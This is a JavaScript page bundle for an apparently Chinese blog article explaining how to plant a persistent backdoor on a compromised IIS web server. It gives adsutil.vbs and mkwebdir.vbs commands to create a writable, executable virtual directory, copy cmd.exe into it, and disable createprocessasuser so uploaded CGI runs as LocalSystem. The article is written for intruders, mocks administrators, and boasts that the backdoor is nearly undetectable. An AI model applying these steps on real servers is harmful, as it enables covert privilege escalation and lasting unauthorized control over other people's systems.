(window.webpackJsonp=window.webpackJsonp||[]).push([[283],{578:function(t,s,n){"use strict";n.r(s);var a=n(7),e=Object(a.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"真正的iis永远的后门解密"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#真正的iis永远的后门解密"}},[t._v("#")]),t._v(" 真正的IIS永远的后门解密")]),t._v(" "),s("p",[t._v("IIS是比较流行的www服务器，设置不当漏洞就很多。入侵iis服务器后留下后门，以后就可以随时控制。一般的后门程序都是打开一个特殊的端口来监听，比如有nc,ntlm,rnc等等都是以一种类telnet的方式在服务器端监听远程的连接控制。")]),t._v(" "),s("p",[t._v("IIS是比较流行的www服务器，设置不当漏洞就很多。入侵iis服务器后留下后门，以后就可以随时控制。一般的后门程序都是打开一个特殊的端口来监听，比如有nc,ntlm,rnc等等都是以一种类telnet的方式在服务器端监听远程的连接控制。不过一个比较防范严密的www站点（他们的管理员吃了苦头后）一般通过防火墙对端口进行限制，这样除了管理员开的端口外，其他端口就不能连接了。但是80端口是不可能关闭的（如果管理员没有吃错药）。那么我们可以通过在80端口留后门，来开启永远的后门。")]),t._v(" "),s("p",[t._v("当IIS启动CGI应用程序时，缺省用CreateProcessAsUser API来创建该CGI的新Process,该程序的安全上下文就由启动该CGI的用户决定。一般匿名用户都映射到IUSR_computername这个账号，当然可以由管理员改为其他的用户。或者由浏览器提供一个合法的用户。两者的用户的权限都是比较低，可能都属于guest组的成员。其实我们可以修改iis开启CGI的方式，来提高权限。我们来看iis主进程本身是运行在localsystem账号下的，所以我们就可以得到最高localsystem的权限。")]),t._v(" "),s("p",[t._v("入侵web服务器后，一般都可以绑定一个cmd到一个端口来远程控制该服务器。这时可以有GUI的远程控制，比如338Array，或者类telnet text方式的控制，比如rnc。nc肯定是可以用的,其实这也足够了。")]),t._v(" "),s("ol",[s("li",[t._v("telnet到服务器")])]),t._v(" "),s("p",[t._v("2.cs cript.exe adsutil.vbs enum w3svc/1/root")]),t._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("KeyType "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("STRING"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"IIsWebVirtualDir"')]),t._v("\nAppRoot "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("STRING"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/LM/W3SVC/1/ROOT"')]),t._v("\nAppFriendlyName "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("STRING"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"默认应用程序"')]),t._v("\nAppIsolated "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("INTEGER"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v("\nAccessRead "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BOOLEAN"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" True\nAccessWrite "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BOOLEAN"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" False\nAccessExecute "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BOOLEAN"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" False\nAccesss cript "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BOOLEAN"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" True\nAccessSource "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BOOLEAN"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" False\nAccessNoRemoteRead "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BOOLEAN"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" False\nAccessNoRemoteWrite "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BOOLEAN"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" False\nAccessNoRemoteExecute "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BOOLEAN"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" False\nAccessNoRemotes cript "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BOOLEAN"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" False\nHttpErrors "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("LIST"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("32")]),t._v(" Items"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"400,*,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\400"}},[t._v("\\400")]),t._v('.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"401,1,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\401"}},[t._v("\\401")]),t._v('-1.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"401,2,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\401"}},[t._v("\\401")]),t._v('-2.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"401,3,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\401"}},[t._v("\\401")]),t._v('-3.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"401,4,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\401"}},[t._v("\\401")]),t._v('-4.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"401,5,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\401"}},[t._v("\\401")]),t._v('-5.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"403,1,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\403"}},[t._v("\\403")]),t._v('-1.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"403,2,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\403"}},[t._v("\\403")]),t._v('-2.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"403,3,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\403"}},[t._v("\\403")]),t._v('-3.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"403,4,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\403"}},[t._v("\\403")]),t._v('-4.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"403,5,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\403"}},[t._v("\\403")]),t._v('-5.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"403,6,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\403"}},[t._v("\\403")]),t._v('-6.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"403,7,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\403"}},[t._v("\\403")]),t._v('-7.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"403,8,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\403"}},[t._v("\\403")]),t._v('-8.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"403,9,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\403"}},[t._v("\\403")]),t._v('-9.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"403,10,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\403"}},[t._v("\\403")]),t._v('-10.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"403,11,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\403"}},[t._v("\\403")]),t._v('-11.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"403,12,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\403"}},[t._v("\\403")]),t._v('-12.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"403,13,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\403"}},[t._v("\\403")]),t._v('-13.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"403,15,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\403"}},[t._v("\\403")]),t._v('-15.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"403,16,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\403"}},[t._v("\\403")]),t._v('-16.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"403,17,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\403"}},[t._v("\\403")]),t._v('-17.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"404,*,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\404"}},[t._v("\\404")]),t._v('b.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"405,*,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\405"}},[t._v("\\405")]),t._v('.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"406,*,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\406"}},[t._v("\\406")]),t._v('.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"407,*,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\407"}},[t._v("\\407")]),t._v('.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"412,*,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\412"}},[t._v("\\412")]),t._v('.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"414,*,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\414"}},[t._v("\\414")]),t._v('.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"500,12,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\500"}},[t._v("\\500")]),t._v('-12.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"500,13,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\500"}},[t._v("\\500")]),t._v('-13.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"500,15,FILE,C:\\WINNT\\help\\iisHelp'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\c"}},[t._v("\\c")]),t._v("ommon"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\500"}},[t._v("\\500")]),t._v('-15.htm"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"500,100,URL,/iisHelp/common/500-100.asp"')]),t._v("\n\nFrontPageWeb "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BOOLEAN"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" True\nPath "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("STRING"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"c:\\inetpub\\wwwroot"')]),t._v("\nAccessFlags "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("INTEGER"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("513")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("/w3svc/1/root/localstart.asp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("/w3svc/1/root/_vti_pvt"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("/w3svc/1/root/_vti_log"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("/w3svc/1/root/_private"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("/w3svc/1/root/_vti_txt"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("/w3svc/1/root/_vti_s cript"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("/w3svc/1/root/_vti_cnf"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("/w3svc/1/root/_vti_bin"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br"),s("span",{staticClass:"line-number"},[t._v("10")]),s("br"),s("span",{staticClass:"line-number"},[t._v("11")]),s("br"),s("span",{staticClass:"line-number"},[t._v("12")]),s("br"),s("span",{staticClass:"line-number"},[t._v("13")]),s("br"),s("span",{staticClass:"line-number"},[t._v("14")]),s("br"),s("span",{staticClass:"line-number"},[t._v("15")]),s("br"),s("span",{staticClass:"line-number"},[t._v("16")]),s("br"),s("span",{staticClass:"line-number"},[t._v("17")]),s("br"),s("span",{staticClass:"line-number"},[t._v("18")]),s("br"),s("span",{staticClass:"line-number"},[t._v("19")]),s("br"),s("span",{staticClass:"line-number"},[t._v("20")]),s("br"),s("span",{staticClass:"line-number"},[t._v("21")]),s("br"),s("span",{staticClass:"line-number"},[t._v("22")]),s("br"),s("span",{staticClass:"line-number"},[t._v("23")]),s("br"),s("span",{staticClass:"line-number"},[t._v("24")]),s("br"),s("span",{staticClass:"line-number"},[t._v("25")]),s("br"),s("span",{staticClass:"line-number"},[t._v("26")]),s("br"),s("span",{staticClass:"line-number"},[t._v("27")]),s("br"),s("span",{staticClass:"line-number"},[t._v("28")]),s("br"),s("span",{staticClass:"line-number"},[t._v("29")]),s("br"),s("span",{staticClass:"line-number"},[t._v("30")]),s("br"),s("span",{staticClass:"line-number"},[t._v("31")]),s("br"),s("span",{staticClass:"line-number"},[t._v("32")]),s("br"),s("span",{staticClass:"line-number"},[t._v("33")]),s("br"),s("span",{staticClass:"line-number"},[t._v("34")]),s("br"),s("span",{staticClass:"line-number"},[t._v("35")]),s("br"),s("span",{staticClass:"line-number"},[t._v("36")]),s("br"),s("span",{staticClass:"line-number"},[t._v("37")]),s("br"),s("span",{staticClass:"line-number"},[t._v("38")]),s("br"),s("span",{staticClass:"line-number"},[t._v("39")]),s("br"),s("span",{staticClass:"line-number"},[t._v("40")]),s("br"),s("span",{staticClass:"line-number"},[t._v("41")]),s("br"),s("span",{staticClass:"line-number"},[t._v("42")]),s("br"),s("span",{staticClass:"line-number"},[t._v("43")]),s("br"),s("span",{staticClass:"line-number"},[t._v("44")]),s("br"),s("span",{staticClass:"line-number"},[t._v("45")]),s("br"),s("span",{staticClass:"line-number"},[t._v("46")]),s("br"),s("span",{staticClass:"line-number"},[t._v("47")]),s("br"),s("span",{staticClass:"line-number"},[t._v("48")]),s("br"),s("span",{staticClass:"line-number"},[t._v("49")]),s("br"),s("span",{staticClass:"line-number"},[t._v("50")]),s("br"),s("span",{staticClass:"line-number"},[t._v("51")]),s("br"),s("span",{staticClass:"line-number"},[t._v("52")]),s("br"),s("span",{staticClass:"line-number"},[t._v("53")]),s("br"),s("span",{staticClass:"line-number"},[t._v("54")]),s("br"),s("span",{staticClass:"line-number"},[t._v("55")]),s("br"),s("span",{staticClass:"line-number"},[t._v("56")]),s("br"),s("span",{staticClass:"line-number"},[t._v("57")]),s("br"),s("span",{staticClass:"line-number"},[t._v("58")]),s("br")])]),s("p",[t._v("不要告诉我你不知道上面的输出是什么！！！！\n现在我们心里已经有底了，是不是！呵呵 管理员要倒霉了")]),t._v(" "),s("ol",{attrs:{start:"3"}},[s("li",[t._v("mkdir c:\\inetpub\\wwwroot\\dir1")]),t._v(" "),s("li",[t._v('cs cript.exe mkwebdir.vbs -c MyComputer -w "Default Web Site" -v "Virtual Dir1","c:\\inetpub\\wwwroot\\dir1"')])]),t._v(" "),s("p",[t._v("这样就建好了一个虚目录：Virtual Dir1\n你可以用 1 的命令看一下")]),t._v(" "),s("p",[t._v("这样就建好了一个虚目录：Virtual Dir1\n你可以用 1 的命令看一下")]),t._v(" "),s("p",[t._v("5.接下来要改变一下Virtual Dir1的属性为execute")]),t._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("cs cript.exe adsutil.vbs "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" w3svc/1/root/Virtual Dir1/accesswrite "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"true"')]),t._v(" -s:\ncs cript.exe adsutil.vbs "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" w3svc/1/root/Virtual Dir1/accessexecute "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"true"')]),t._v(" -s:\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br")])]),s("p",[t._v("现在你已经可以upload 内容到该目录，并且可以运行。你也可以把cmd.exe net.exe直接拷贝到虚拟目录的磁盘目录中。")]),t._v(" "),s("p",[t._v("现在你已经可以upload 内容到该目录，并且可以运行。你也可以把cmd.exe net.exe直接拷贝到虚拟目录的磁盘目录中。")]),t._v(" "),s("p",[t._v("6.以下命令通过修改iis metabase 来迫使iis以本身的安全环境来创建新的CGI process")]),t._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("Cs cript adsutil.vbs "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" /w3svc/1/root/"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("your directory"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("/createprocessasuser "),s("span",{pre:!0,attrs:{class:"token boolean"}},[t._v("false")]),t._v("\n注释：cs cript windows s cript host.\nadsutil.vbs windows iis administration s cript\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br")])]),s("p",[t._v("后面是 iis metabase path\n这样的后门几乎是无法查出来的，除非把所有的虚目录察看一遍（如果管理员写好了遗书，那他就去查吧）")]),t._v(" "),s("h2",{attrs:{id:"写在最后"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[t._v("#")]),t._v(" 写在最后")]),t._v(" "),s("blockquote",[s("p",[t._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),s("strong",[t._v("冰河技术")]),t._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),s("strong",[t._v("冰河技术")]),t._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),s("strong",[t._v("冰河技术")]),t._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),s("strong",[t._v("冰河技术")]),t._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),t._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);s.default=e.exports}}]);